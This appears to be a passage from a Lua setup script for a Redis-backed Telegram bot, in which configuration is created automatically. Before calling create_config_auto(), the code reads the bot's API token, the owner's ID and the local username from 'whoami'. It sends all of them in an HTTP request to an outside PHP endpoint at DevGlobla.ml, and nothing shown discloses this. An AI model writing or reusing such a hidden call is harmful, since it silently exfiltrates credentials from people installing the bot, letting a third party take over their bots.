...
globlainfo = {}
globlainfo.id = redis:get(id_server..":SUDO:ID")
globlainfo.tokenbot  = redis:get(id_server..":token")
globlainfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('http://DevGlobla.ml/GLOBLA/Globla.php?insert='..JSON.encode(globlainfo))
create_config_auto()
